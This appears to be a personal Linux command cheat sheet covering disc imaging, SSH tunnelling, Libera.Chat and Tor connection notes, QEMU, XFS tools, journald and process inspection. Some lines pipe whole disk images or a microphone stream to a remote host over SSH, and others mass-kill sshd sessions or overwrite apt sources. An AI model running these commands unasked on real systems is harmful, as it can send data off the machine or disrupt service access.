cdrwtool -g             ## Print write parameters


dvdisaster --verbose --medium-info
dvdisaster --verbose --scan                                   ## Scan the medium for read errors
dvdisaster --verbose --device /dev/sr0 --scan       ## Scans the medium in drive /dev/hdc for errors.

dvdisaster --verbose --device /dev/sr0 --image $Disk.iso --read

## Create .ecc information for the medium image
dvdisaster --verbose --create --ecc $File.ecc  
dvdisaster --verbose --image $Disk.iso --ecc $File.ecc --create


## Specifies that RS03 should create error correction files
dvdisaster --verbose --ecc-target $file


## Try to fix medium image using .ecc information
dvdisaster  --verbose--fix --image $DvD.iso --ecc $File.ecc


## use optimized strategy for reading damaged media
dvdisaster --verbose --adaptive-read --device /dev/sr0

dvdisaster --verbose --device /dev/sr0 --image $Disk.iso --ecc $File.ecc --read --adaptive-read

dvdisaster --verbose --device /dev/sr0 --image $Disk.iso --read-attempts 2-4 -r


## attempts n up to m reads of a defective sector
dvdisaster --verbose --read-attempts 4-8 --device /dev/sr0




## Reads an image from drive /dev/sdc into the file $Disk.iso
## Each sectors integrity is verified by using its EDC and L-EC raw data.
dvdisaster --verbose --device /dev/sr0 --image $Disk.iso --read-raw --read


## Creates an error correction file corr.ecc for the image $Disk.iso
dvdisaster --verbose --image $Disk.iso --ecc $File.ecc --create

##-================================================-##
##  [+] Repairs the image file $Disk.iso 
##      using the error correction file corr.ecc.
##-================================================-##
dvdisaster --verbose --image $Disk.iso --ecc $File.ecc --fix

##-================================================-##
##  [+] Verifies the image $Disk.iso with information
##      from the error correction file corr.ecc.
##-================================================-##
dvdisaster --verbose --image $Disk.iso --ecc $File.ecc --test


              
dvdisaster --verbose --fix                               ## Try to fix medium image using .ecc information
dvdisaster --eject


genisoimage -boot-info-table




genisoimage -o cd.iso -r cd_dir		# create a CD with Rock Ridge extensions of the source directory cd_dir:

genisoimage -map
genisoimage -root-info
genisoimage -log-file






# output your microphone to a remote computers speaker
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp



dc3dd verb=on 

 bs=2048


Create and burn an ISO image

copy the cd or DVD sector for sector.
dd if=/dev/hdc of=/tmp/mycd.iso bs=2048 conv=notrunc




Burn a CD/DVD ISO image

cdrecord -scanbus # To find the burner device (like 1,0,0)
cdrecord dev=1,0,0 imagefile.iso




create a CD/DVD image from files in a directory

mkisofs -J -L -r -V $TITLE -o $imagefile.iso /$Dir/



growisofs -dvd-compat -Z /dev/dvd=$File.iso         # Burn existing iso image
growisofs -dvd-compat -Z /dev/dvd -J -R /$Dir/    # Burn directly


# Create CD-ROM ISO with cloud-init config
"Generating ISO for cloud-init"
genisoimage -output $CI_ISO -volid cidata -joliet -r $USER_DATA $META_DATA &>> ${VMNAME}.log


mkisofs -o $CI_ISO -V cidata -J -r $USER_DATA $META_DATA &>> ${VMNAME}.log

Xe1phix-[Audiophile]

Cut Video

ffmpeg -i movie.mp4 -ss 00:00:03 -t 00:00:08 -async 1 cut.mp4



##-=================================-##
##   [+] Backup Grub to a disk
##-=================================-##
cd /tmp
grub-mkrescue --output=grub-img.iso
dd if=grub-img.iso of=/dev/fd0 bs=1440 count=1



## ########################################## ###"
##    -L tells ssh to listen on a local port and forward 
##         those connections to another host and port 
##         through the ssh connection. 	##
## ########################################## ###"
┌─[root@parrot]
└──╼ $ ssh -L 4242:127.0.0.1:4242 user1@machine1
┌─[root@parrot]
└──╼ $ ssh -L 4242:127.0.0.1:4242 user2@machine2
┌─[root@parrot]
└──╼ $ ssh -L 4242:127.0.0.1:4242 user3@machine3



echo "## ########################################## ###"
echo "## -D tells ssh to open up a SOCKS 4 server where you specify. 	##"
echo "## ########################################## ###"
┌─[root@parrot]
└──╼ $ ssh -D 4242 userN@machineN

Personal box:
ssh -L 5901:localhost:5901 -N -f kali@<target IP> -i amazon.pem
tightvncconnect 127.0.0.1:5901

ssh -i amazon.pem kali@<target IP>

tsocks ssh -D 4242 user@someshell.net

forward-socks4 fascist.torhater.com localhost:4242 .


## inform your IRC client to use localhost:4242 as a SOCKS4 proxy




dd if=/dev/random bs=4k count=1 | gpg ‐a ‐‐cipher‐algo AES256 ‐c ‐ > /mnt/usb/keys/fs.gpg
gpg ‐q ‐o ‐ /mnt/usb/keys/fs.gpg | cryptsetup ‐v ‐c aes create cryptfs /dev/hdxN
mkfs.ext3 /dev/mapper/cryptfs
mount /dev/mapper/cryptfs /crypto





i2p IRC servers


http://127.0.0.16668

/connect 127.0.0.1 6668

localhost 6668

mIRC:
//server -m localhost 6668

localhost:4444 and/or localhost:4445 for HTTPS


I2P BitTorrent client
http://127.0.0.1:7657/i2psnark




i2p webserver
http://127.0.0.1:7657/susimail












http://127.0.0.1:7658




















https://web.libera.chat/
ircs://irc.libera.chat:6697
irc://irc.libera.chat:6667


connect to Libera.Chat by pointing your IRC client at 
irc.libera.chat ports 6665-6667

plain-text connections:

8000-8002
port 6697 
port 7000



Accessing Libera.Chat Via TLS

Libera.Chat provides 
TLS client access on all servers Using:

port 6697
port 7000
port 7070




Client TLS certificates are also supported, 
and may be used for identification to services. 
For instructions, see our guide on CertFP. 

If you have connected 
with a client certificate, 
has client certificate 
fingerprint f1ecf46714198533cda14cccc76e5d7114be4195 

(showing your certificate’s SHA512 fingerprint





https://libera.chat/guides/connect#accessing-liberachat-via-tor


Accessing Libera.Chat Via Tor

Libera.Chat is also reachable via Tor, 
bound to some restrictions. 
You can’t directly connect to irc.libera.chat via Tor; 
use the following hidden service as the server address instead:

libera75jm6of4wxpxt4aynol3xjmbtxgfyjpu34ss4d7r7q2v5zrpyd.onion

The hidden service requires SASL authentication. 
In addition, due to abuse we have seen across other networks 
in the past, we have unfortunately had to add another couple of restrictions:

You must log in using:

SASL EXTERNAL 
			or 
ECDSA-NIST256P-CHALLENGE


Connecting using SASL EXTERNAL requires that you connect using TLS encryption.


Verifying Tor TLS connections

A Tor hidden service name securely identifies the service you are connecting to. Verifying the TLS server certificate is strictly-speaking unnecessary while using the hidden service. Nonetheless you may verify the hidden service’s TLS server certificate by adding the following fragment to your torrc configuration file and configure your client to connect to palladium.libera.chat via Tor. The TLS server certificate used by the hidden service will validate using this hostname.

# torrc snippet:
MapAddress palladium.libera.chat 
libera75jm6of4wxpxt4aynol3xjmbtxgfyjpu34ss4d7r7q2v5zrpyd.onion

Older clients that don’t support SOCKS4a or later 
will need to use MapAddress with an IP address, 
and the certificate will not validate successfully. 
In this case validation will need to be disabled.

Note that the hidden service’s certificate changes 
periodically as it is updated. 
This means that the certificate fingerprint can not be reliably pinned.





https://github.com/Libera-Chat/libera-chat.github.io
https://fosstodon.org/@liberachat





https://libera.chat/guides/connect
https://libera.chat/guides/sasl
https://libera.chat/guides/certfp


https://libera.chat/guides/registration
https://libera.chat/guides/usermodes






















TLS-encrypted connections

port 7070






Connect by pointing your IRC client to 

irc.libera.chat:6697 (TLS)






https://github.com/topics/network-meta-analysis











  
qemu-img convert -f raw -O qcow2 /var/lib/libvirt/images/ubuntu14-HD.img /home/opsmx/spinnaker.qcow2
  
  
  
qemu-img convert -O qcow2 REMnuxV6-disk1.vmdk remnux.qcow2
  


qemu-system-x86_64 -enable-kvm -cpu host -smp ${numsmp} -m ${memsize} -drive file=${imgloc}/${imgfile},format=raw -boot d -cdrom ${isoloc}/ubuntu-16.04.3-server-amd64.iso -vnc :95 -net nic -net user -monitor tcp::9666,server,nowait -localtime 

qemu-system-x86_64 -enable-kvm -cpu host -smp ${numsmp} -m ${memsize} -drive file=${imgloc}/${imgfile},format=qcow2 -boot d -cdrom ${isoloc}/ubuntu-16.04.6-server-amd64.iso -vnc :95 -net nic -net user -localtime



qemu-img create -f qcow2 ubuntu1604qcow2.img 8G


qemu-img create -f raw ubuntu1604raw.img 8G


qemu-img create -f qcow2 -b ubuntu1604qcow2.img ubuntu1604qcow2.ovl

qemu-img info ubuntu1604qcow2.ovl

qemu-img commit ubuntu1604qcow2.ovl


# Create snapshot
echo "Create snapshot for $VM_NAME..."
virsh snapshot-create-as --domain $VM_NAME snap --diskspec vda,file=$VM_DIR/"$VM_NAME"-snap.qcow2 --disk-only --atomic --no-metadata --quiesce || { echo >&2 "Snapshot creation failed for $VM_NAME. Aborting backup."; exit 4; }

# Commit snapshot
echo "Commit snapshot..."
virsh blockcommit $VM_NAME vda --active --pivot



Use DD to byte copy the Digital Ocean partition, 
feeding it into gzip, 
## and then transfer it over SSH to the Storage Location.
dd if=/dev/vda | gzip -1 - | ssh @ dd of=/storage/location/snapshot.image.gz


## Backup harddisk to remote machine ##
dd bs=1M if=/dev/sda | gzip | ssh user@remote 'dd of=sda.gz'




Step 4. Convert the DD image to a the qcow2 disk format with the 'qemu-img' utility.

qemu-img convert -O qcow2 /storage/location/snapshot.image /storage/location/snapshot.qcow2



















lsscsi --classic                    ## 
lsscsi --hosts                      ## List the SCSI hosts currently attached to the system


lsscsi --verbose --scsi_id       ## show udev derived /dev/disk/by-id/scsi* entry
lsscsi --verbose --long          ## additional information output

lsscsi --verbose --list --long --device --size  ## List information about all SCSI devices:

cat /proc/mdstat                    ## Display information about RAID arrays and devices
mdadm --detail --scan
mdadm --misc -Q /dev/sdd1   ## Display information about a device
mdadm --misc -D /dev/md0    ## Display detailed information about the RAID array
mdadm --misc -o /dev/md0    ## Mark the RAID array as readonly
mdadm --misc -w /dev/md0    ## Mark the RAID array as read & write


ls /dev/mapper | grep 
$(grep "md[0-9]")
grep "hd[a-z][a-z][0-9]"
grep "sd[a-z][a-z][0-9]"
/dev/mmcblk0p1
/dev/nvme0n1p1



BLOCKSIZE=$(fsstat $PARTITION | head -40 | grep -a "Allocation Block Size" | awk ' { print $4 } ')
BLOCKSIZE=$(tune2fs -l $PARTITION | grep -a "Block size" | awk ' { print $3 } ')





mpstat 1
vmstat 2
iostat 2
ipcs ‐a

showmount --all
findfs LABEL=



## XFS has both primary and secondary superblocks.


##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    mkfs.xfs -l logdev=/dev/sdb1,size=10m /dev/sda1
    mkfs.xfs -l internal,size=10m
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##


##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_info /dev/sda1
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfsdump -l level -f $BackupDestination $SourcePath
    
    xfsdump -f /mnt/bkup /mnt/xfsdata		            ## Creates a file-based backup of the /mnt/xfsdata directory
    xfsdump -v debug -p 15 -f /mnt/bkup /mnt/xfsdata    ## Verbose (debug), 15 sec intervals, 
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_metadump -g $Source $Target                     ## Shows dump progress.
    xfs_metadump -g /dev/$Disk ~/xfs-metadata
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_metadump /dev/sdd ~/xfs-metadata
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_metadump -g -l $dst /dev/sdd ~/xfs-metadata     ## external log
    xfs_metadump -a -g /dev/sdd ~/xfs-metadata          ## Copies entire metadata blocks
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_mdrestore -g -i $Source $Target
    xfs_mdrestore -g -i ~/xfs-metadata /dev/$Disk
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_check /dev/$Disk
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_repair -v -t 17 /dev/$Disk
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfsrestore -L $Label -f $backupLocation $RestorePath
    
    xfsrestore -f ~/xfsdump-data -L $Label /dev/$Disk
    xfsrestore -f ./xfsdump-data -L 'session1' /dev/$Disk
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##

##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_repair -n -x        ## Read all file data extents to look for disk errors.
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_repair -n           ## no modify mode
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##



cat -vET /proc/cmdline | xxd


##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_info /dev/sdb1					## Query the filesystem for information:
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
    xfs_admin -u /dev/vda1				## UUID associated with the noted LV:
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##

##-=========================================================================================================-##
	xfs_admin -j /dev/sda		## Enables version 2 log format (journal which supports larger log buffers)
##-=========================================================================================================-##
	xfs_admin -u /dev/sda1		## Display filesystems UUID
##-=========================================================================================================-##
	xfs_admin -l /dev/sda		## Display filesystems label
##-=========================================================================================================-##



## Extract and print buffer information
## continue when an error is detected
## Extract and print inode information
xfs_logprint -b -c -i /dev/sdc


## 
xfs_logprint -C file


## Dump the log from front to end, printing where each log record is located on disk
xfs_logprint -d


## Extract and print quota information
xfs_logprint -q     





xfs_spaceman -c info       ## Displays selected geometry information about the filesystem.

xfs_spaceman -c help

xfs_spaceman -c print       ## Display a list of all open files


xfs_spaceman -c freesp -s       ## Display a summary of the free space information found.


xfs_spaceman -c freesp -g       ## Print the free space block and extent counts for each AG.


xfs_spaceman -c freesp -d       ## Print debugging information such as the raw free space extent information



## 



##-=========================================================================================================-##
    xfs_quota -x -c 'report -h' /home       ## display a sample quota report for /home
##-=========================================================================================================-##


##-===========================================================================-##
##   [+] Set a soft and hard inode count limit of 500 and 700 for user john
##-===========================================================================-##
xfs_quota -x -c 'limit isoft=500 ihard=700 john' /home/


##-=============================================================-##
##   [+] Set a soft and hard block limit of 1000m and 1200m
##       [-] Apply to the $Group group
##       [-] Use the $Path File system
##-=============================================================-##
xfs_quota -x -c 'limit -g bsoft=1000m bhard=1200m $Group' $Path




xfs_growfs /mount/point -D size         ## grows the file system to the specified size







echo $Value > /sys/fs/xfs/device/error/default/max_retries

echo value > /sys/fs/xfs/device/error/metadata/condition/retry_timeout_seconds





xfs_freeze -f $MountPoint					## suspend (that is, freeze) an XFS file system

xfs_freeze -u $MountPoint					## unfreeze an XFS file system:



fsfreeze --freeze $MountPoint           ## specified a filesystem to be frozen from new modifications

fsfreeze --unfreeze $MountPoint         ## un-freeze the filesystem and allow operations to continue



## enables access control lists
## enables user extended attributes
mount -o acl,user_xattr /dev/device /mount/point




capsh --print | grep "Bounding set "



## Test for AmbientCapabilities
grep "CapAmb:" /proc/self/status





##-==============================================================-##
##  [+] 
##-==============================================================-##
pcat -v <PID> > /home/poo/xntps.pcat        ## Location of Each Memory Region That is Being Copied## 


##-==============================================================-##
##  [+] 
##-==============================================================-##
pmap -d 7840                                ## Display Libraries currently loaded by that process



##-==============================================================-##
##  [+] 
##-==============================================================-##





##-==============================================================-##
##  [+] 
##-==============================================================-##




ps -eo pid,user,group,args,etime,lstart jgrep $PID



gconftool-2 --type string --set org/mate/terminal/keybindings/copy '<Ctrl>c'
gconftool-2 --type string --set org/mate/terminal/keybindings/paste '<Ctrl>v'



gsettings list-schemas > ~/gsettings-schemas.txt
gsettings list-recursively > ~/gsettings-list-recursively.txt

/var/lib/gconf/debian.defaults
/var/lib/gconf/debian.mandatory
/usr/share/gconf/defaults/
/usr/share/gconf/mandatory/




# Configuration can be per repo (.git/config), per user (~/.gitconfig), or per system # (/etc/gitconfig)
# git config --global user.name "xe1phix"
# git config --global user.email "xe1phix@gmail.com"
# git config --global core.editor "pluma"
# git config --global color.ui true
# git config --global core.excludesfile ~/.gitignore_global
# git config --global core.editor pluma
# git config --global branch.autosetuprebase always
# git config --system ... # for /etc/gitconfig changes
# git config --list
# git config --global commit.template $HOME/.gitmessage
# git config --global user.signingkey <gpg-key-id>
# For binaries, to diff (create ~/.gitattributes w/ e.g. ``*.doc diff-word''
# git config --global diff.word.textconv strings
# git config --global diff.exif.textconv exiftool
# git config --global filter.indent.clean indent
# git config --global filter.indent.smudge cat
# git config --global pull.rebase false # auto rebase on git pull
# git config --global http.sslVerify true


verify commit signatures

git log --show-signature            ## Displays all commits and verify signed ones

git verify-commit HEAD              ## Displays and verify the latest commit











git show HEAD --show-signature













/etc/apt/sources.list


















add the Docker repository key using `apt-key`:

        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 36A1D7869245C8950F966E92D8576A8BA88D21E9

2.  Add the Docker repository to your apt sources:

        echo "deb http://get.docker.io/ubuntu docker main" | sudo tee /etc/apt/sources.list.d/docker.list









echo "deb http://archive.ubuntu.com/ubuntu precise main universe" > /etc/apt/sources.list


docker run -i -t ubuntu /bin/bash




















apt-cache show $Package | grep -i status








Flush DNS cache
killall -HUP mDNSResponder


kill ‐s TERM $PID               ## [15] TERM (software termination signal)
killall ‐1 $Service             ## [ 1] HUP (hang up)
kill -SIGHUP $PID               ## [ 1] HUP (hang up)
pkill ‐9 $Service               ## [ 9] KILL (non­catchable, non­ignorable
kill -SIGKILL $PID              ## [ 9]  SIGKILL (Kill signal)
killall -9 $Service             ## [ 9]  SIGKILL (Kill signal)
pkill ‐TERM ‐u $User            ## [15] TERM (software termination signal)
kill -SIGTERM $PID              ## [15] SIGTERM (Termination signal.)
fuser ‐k ‐TERM ‐m /home         ## [15] kill every process accessing /home (to umount)

kill -9 $$                      ## Kill current session


kill $(ps -ef | awk '/sshd/ {print $2}')
kill $(ps -ef | awk '/mysql/ {print $2}')

kill `netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f1 -d/`
/etc/init.d/`netstat -anp --tcp -4 | awk '/:22/ && /LISTEN/ { print $7 }' | cut -f2 -d/` stop


## use kill to remove any user remotely running ssh off your box ##

kill $(ps -ef | awk '/sshd/ {print $2}')

kill $(ps -ef | awk '/cupsd/ {print $2}')



watch -n 1 lsof -nPi :47145
watch -n 1 lsof -nPi tcp:22
watch --color -n 1 lsof -nPi tcp:443
watch --color -n 1 lsof -nPi tcp:80
watch --color -n 1 
watch --color -n 1 lsof -i udp:5353 -t
watch --color -n 1 lsof -iTCP -sTCP:LISTEN
watch --color -n 1 lsof -t -c sshd
watch --color -n 1 lsof -i tcp:ssh
watch --color -n 1 lsof -i tcp:22
watch --color -n 1 lsof -u syslog

watch --color -n 1 lsof +d /var/log

View user activity per directory.

sudo lsof -u someuser -a +D /etc


watch --color -n 1 lsof -i udp -u root





while :; do kill -9 `lsof -t -i :47145`; done

 

for foo in $(strace -e open lsof -i tcp 2>&1 | grep 'denied'| awk '{print $1}' | cut -d "/" -f3); do echo $foo $(cat /proc/$foo/cmdline)|awk '{if($2) print}'; done






ps -eo pid,user,group,gid,vsz,rss,comm --sort=-rss | less

ps -ef --sort=user | less



## kill all related processes using your device
fuser -mk /dev/sdc




service --status-all | grep running
service --status-all | grep running... | sort
chkconfig --list
chkconfig --add

systemctl list-units | grep .service
systemctl list-units | grep .target
systemctl list-unit-files --type=service
systemctl list-unit-files --type=target
systemctl list-unit-files --type=service | grep -v disabled


systemctl --all list-units | grep .service



--signal

--state
--full
--user
--system


--property
--value
--recursive
--show-types


systemctl --all list-unit-files
systemctl --all --show-types

systemctl show --property "Wants" multi-user.target
systemctl show --property "Requires" multi-user.target
systemctl show --property "WantedBy" getty.target
systemctl show --property "Wants" multi-user.target | fmt -10 | sed 's/Wants=//g' | sort


systemctl status $Service | grep -i active
systemctl is-enabled 


strings /sbin/init | grep -i systemd



cat /etc/systemd/system/My_New_Service.service
cat /lib/systemd/system/sshd.service


List failed units:
systemctl --failed


Show the cgroup slice, memory and parent for a PID:
systemctl status pid


| grep -Fe .service -e .socket



       Example 1: Find the process ID of the named daemon:
pgrep -u root,daemon
pgrep -u root named

       Example 2: Make syslog reread its configuration file:
kill -HUP syslogd

       Example 3: Give detailed information on all xterm processes:

ps -fp $(pgrep -d, -x xterm)

       Example 4: Make all chrome processes run nicer:

renice +4 $(pgrep chrome)


/proc/pid/stat




##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##

rkhunter --quiet --verbose-logging --summary --hash SHA256 --cronjob --logfile /var/log/rk.log --check


## grant read access to all members of the "wheel" and "adm" system groups
setfacl -Rnm g:wheel:rx,d:g:wheel:rx,g:adm:rx,d:g:adm:rx /var/log/journal/


## On systems where /var/log/journal/ does not exist 
## yet but where persistent logging is desired.
## create the directory, and ensure it has the correct access modes:
mkdir --mode=0774 /var/log/journal

systemd-tmpfiles --create --prefix /var/log/journal

/etc/systemd/journald.conf




journalctl --list-boots | head
journalctl -b 7e4e564534f5477d8eabe7b4886d42a0      ## You can also use the boot ID to call back the data from a boot:

cat /var/log/boot.log
cat ~/.cache/libvirt/qemu/log/pc1.log
journalctl -k                           ## kernel messages
journalctl -k -f                        ## follow kernel messages
journalctl --file system.journal -k     ## Systemd stored kernel messages in the journal file


journalctl -u NetworkManager.service    ## Service messages
journalctl -f -u NetworkManager.service ## follow service
journalctl -fn 0 -u NetworkManager -u wpa_supplicant
journalctl -u httpd.service             ## 
journalctl -k -b -1                     ## view the boot logs
journalctl /dev/sda                     ## all logs of the kernel device node `/dev/sda`
journalctl -u systemd-networkd
journalctl -u auditd.service            ## 

journalctl --file system.journal  _SYSTEMD_UNIT=sshd.service


##   [?] Systemd Journal logs stdout and sdterr:

journalctl --file user-1000.journal _TRANSPORT=stout



journalctl --list-boots                 ## check only boot messages
journalctl -b $BootID                   ## show boot messages for a selected boot ID

journalctl _SYSTEMD_UNIT=avahi-daemon.service
journalctl -p emerg..err
journalctl -o verbose
journalctl --since "2019-07-05 21:30:01" --until "2019-07-05 21:30:02"
journalctl -n50 --since "1 hour ago"

--since=
--until=
##   [?] -S (Show entries not newer than the specified date)
##   [?] -U (
journalctl --directory /$Dir -S "2019-07-05 21:30:01" -U "2019-07-05 21:30:02"

journalctl --file system.journal -k

journalctl --file system.journal -o verbose
journalctl --file system.journal -o json > system.journal.json
journalctl --file system.journal -o export > system.journal.export

journalctl --output=short
journalctl --output=short-precise
journalctl --output=short-iso
journalctl --output=short-iso-precise
journalctl --output=short-full
journalctl --output=short-monotonic
journalctl --output=short-unix

journalctl --output=verbose
journalctl --output=export

journalctl --output=json
journalctl --output=json-pretty
journalctl --output=json-sse
journalctl --output=json-seq

journalctl --output=cat
journalctl --output=with-unit




cat /etc/systemd/journald.conf | grep Storage


zless /var/log/kern.log.2.gz


cat ~/.zoom/logs/zoom_stout_sterr.log


cat ~/.config/Jitsi\ Meet/logs/main.log


tail -f /var/log/messages

syslog –f
syslog –d <directory>

bzcat system.log.1.bz2 system.log.0.bz2 >> system_all.log

cat system.log >> system_all.log


journalctl --user-unit=$UNIT        Show logs from the specified user unit

journalctl --identifier=STRING     Show entries with the specified syslog identifier

journalctl --priority=RANGE        Show entries with the specified priority

journalctl --facility=FACILITY...  Show entries with the specified facilities

journalctl --grep=PATTERN          ## Show entries with MESSAGE matching PATTERN
journalctl --pager-end             ## Immediately jump to the end in the pager

journalctl --lines=$INT            ## Number of journal entries to show

journalctl --reverse               ## Show the newest entries first
journalctl --output=               ## Change journal output mode 

journalctl --output-fields=$Field       ## Select fields to print
journalctl --output-fields=verbose      ## Verbose mode
journalctl --output-fields=export       ## Export mode
journalctl --output-fields=json         ## Json mode
Verbose mode
Export mode
Json mode



/etc/systemd/journald.conf
/etc/systemd/journald.conf.d/*.conf
/run/systemd/journald.conf.d/*.conf
/usr/lib/systemd/journald.conf.d/*.conf



journalctl --rotate

journalctl --sync

sd-journal
systemd.journal-fields
sd_journal_print

MaxLevelStore=debug

MaxLevelSyslog=debug

MaxRetentionSec=0
SystemMaxFiles=


Storage=persistent
Compress=
Seal=
SplitMode=uid

RateLimitIntervalSec=
RateLimitBurst=
RateLimitIntervalSec=


--setup-keys




jls -f linux-ext3 img.dd

jcat -f linux-ext3 img.dd 34 | xxd



kill -HUP `pidof syslogd`
kill -HUP `cat /var/run/syslogd.pid`
/sbin/service rsyslog start
/etc/init.d/syslog reload
logger -t "food[$$]" -p local3.warning "$count connections from $host"

syslog-ng-ctl verbose --set=on
syslog-ng-ctl stats

/etc/syslog-ng/syslog-ng.conf


## When auditing is not enabled,
## we can configure the system logger to direct SELinux
## AVC messages into its own logfile. 

## For instance, with the syslog-ng system logger,
## the possible configuration parameters 
## could be as follows:

source kernsrc { file("/proc/kmsg"); };
destination avc { file("/var/log/avc.log"); };
filter f_avc { message(".*avc: .*"); };
log { source(kernsrc); filter(f_avc); destination(avc); };


logwatch --range all --archives --detail High --print | less
logwatch --print | less




loginctl list-users
loginctl user-status
loginctl --all show-user
loginctl list-seats
loginctl seat-status
loginctl show-seat
loginctl terminate-user
loginctl kill-user


systemd-logind.service
logind.conf


pgrep ‐l sshd                   ## Find the PIDs of processes by (part of) name

echo $$                         ## The PID of your shell
fuser ‐va 22/tcp                ## List processes using port 22 (Linux)

ps aux | grep 'ss[h]'           ## Find all ssh pids without the grep pid

chkconfig --list && chkconfig --del $Service && chkconfig --off $Service
service --status-all | grep running... | sort
systemctl status
systemctl stop $Service && systemctl disable $Service && systemctl mask $Service
update-rc.d $Service stop && update-rc.d $Service disable && update-rc.d $Service remove


















net.netfilter.nf_conntrack_timestamp
echo 1 > /proc/sys/net/netfilter/nf_conntrack_timestamp
echo 1 > /proc/sys/net/netfilter/nf_conntrack_acct
net.netfilter.nf_conntrack_acct


modprobe nf_conntrack_ipv4
modprobe nf_conntrack_ipv6

iptables -A INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp -m state --state NEW,ESTABLISHED -j ACCEPT


ps aux | sort -nk +4 | tail



tcp   ESTAB 1812   0                              192.168.1.101:43854          192.168.1.1:netbios-ssn                                                                                
tcp   ESTAB 1812   0                              192.168.1.101:43852          192.168.1.1:netbios-ssn                                                                                
udp   ESTAB 0      0                         192.168.1.101%eth0:bootpc         192.168.1.1:bootps                                                                                     
firefox 2020788 parrotsec-kiosk  125u     IPv4           44783831      0t0      TCP parrot:43924->ec2-44-229-115-174.us-west-2.compute.amazonaws.com:https (ESTABLISHED)
firefox 2020788 parrotsec-kiosk  126u     IPv4           44825012      0t0      TCP parrot:42360->fra02s28-in-f14.1e100.net:https (ESTABLISHED)
firefox 2020788 parrotsec-kiosk  273u     IPv4           44861464      0t0      TCP parrot:48222->172.67.193.211:https (ESTABLISHED)

pgrep ‐l firefox

##  Give detailed information on all xterm processes:
ps -fp $(pgrep -d, -x firefox)
systemctl status 
ps aux | grep firefox
pgrep -u root,firefox
pgrep -u parrotsec-kiosk,firefox


##   Make all firefox processes run nicer:
renice +4 $(pgrep firefox)

journalctl -u firefox












watch --color -n 1 lsof +d /usr/lib/firefox/browser

/home/parrotsec-kiosk/.mozilla/firefox/v7sba4qe.default-release/storage-sync-v2.sqlite-shm






netsniff-ng
trafgen
mausezahn
ifpps
curvetun



iwlist int scan
iw wlan0 scan dump


##-====================================================================================-##
